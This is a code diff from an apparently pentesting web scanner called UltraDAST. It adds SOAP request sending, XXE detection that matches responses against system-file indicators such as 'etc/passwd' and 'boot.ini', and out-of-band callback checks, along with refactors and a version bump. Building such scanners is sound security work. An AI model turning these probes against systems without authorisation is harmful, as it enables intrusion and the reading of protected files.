+    async def _send_request(self, url, payload):
+        if not self.session_manager or not self.session_manager.async_session:
+            return None
+        try:
+            async with self.session_manager.async_session.session.request(
+                'POST', url,
+                data=payload,
+                headers={'Content-Type': 'application/soap+xml', 'SOAPAction': '"test"'},
+                timeout=aiohttp.ClientTimeout(total=10)
+            ) as resp:
+                body = await resp.text()
+                resp._body = body
+                return resp
+        except Exception:
+            return None
+    
+    def _detect_xxe(self, resp):
+        """Detect XXE in response"""
+        body_lower = resp._body.lower()
+        xxe_indicators = ['root:', 'bin:', 'etc/passwd', 'windows/system32', 'boot.ini']
+        return any(indicator in body_lower for indicator in xxe_indicators)
+    
+    def _check_oob_callback(self, marker):
+        """Check if OOB callback was received"""
+        with oob_results_lock:
+            for result in oob_results:
+                if marker in result.get('path', ''):
+                    return True
+        return False
+
 # ---------------------------------------------------------------------
 # WORKER THREAD (QThread)
 # ---------------------------------------------------------------------
@@ -6395,10 +8208,10 @@ class ScannerWorker(QThread):
         if self.scanner:
             checkpoint = {
                 'target': self.target,
-                'visited_urls': list(self.scanner.visited_urls),
-                'vulnerabilities': self.scanner.vulnerabilities,
-                'crawled_pages_count': len(self.scanner.crawled_pages),
-                'parameters_count': len(self.scanner.parameters),
+                'visited_urls': list(self.scanner.crawler_engine.visited_urls),
+                'vulnerabilities': self.scanner.reporting_engine.vulnerabilities,
+                'crawled_pages_count': len(self.scanner.crawler_engine.crawled_pages),
+                'parameters_count': len(self.scanner.crawler_engine.parameters),
                 'timestamp': datetime.now().isoformat()
             }
             self.checkpoint_file = f"checkpoint_{int(time.time())}.json"
@@ -6688,7 +8501,13 @@ class RepeaterTab(QWidget):
                         
                         return status, resp_headers, text
                 
-                status, resp_headers, text = asyncio.run(async_send())
+                # Use new_event_loop instead of asyncio.run() to avoid issues in thread
+                loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop)
+                try:
+                    status, resp_headers, text = loop.run_until_complete(async_send())
+                finally:
+                    loop.close()
                 
                 response_text = f"Status: {status}\n"
                 response_text += f"Headers:\n{json.dumps(resp_headers, indent=2)}\n\n"
@@ -6854,7 +8673,7 @@ class ScanTab(QWidget):
                 cwe_id = vuln.get('cwe', '')
                 if cwe_id:
                     dlg = RemediationDialog(cwe_id, self)
-                    dlg.eec_()
+                    dlg.exec_()
                     
     def show_evidence(self, row, col):
         item = self.findings_table.item(row, 0)
@@ -6878,7 +8697,7 @@ class ScanTab(QWidget):
 class MainWindow(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("UltraDASTv11.7 – Unstoppable Pentester")
+        self.setWindowTitle("UltraDAST v11.9 – Unstoppable Pentester")
         self.resize(1400, 900)
         self.tabs = QTabWidget()
         self.setCentralWidget(self.tabs)
@@ -7209,7 +9028,7 @@ class MainWindow(QMainWindow):
                         ['Low', str(severity_counts['Low'])],
                         ['Info', str(severity_counts['Info'])],
                         ['Scan Date', datetime.now().strftime('%Y-%m-%d %H:%M:%S')],
-                        ['Tool Version', 'UltraDASTv11.7']
+                        ['Tool Version', 'UltraDAST v11.9']
                     ]
                     
                     summary_table = Table(summary_data, colWidths=[2*inch, 2*inch])
@@ -7359,7 +9178,7 @@ class MainWindow(QMainWindow):
                     report = {
                         "scan_info": {
                             "timestamp": datetime.now().isoformat(),
-                            "tool": "UltraDAST v11.7",
+                            "tool": "UltraDAST v11.9",
                             "total_findings": current_tab.findings_table.rowCount()
                         },
                         "vulnerabilities": []
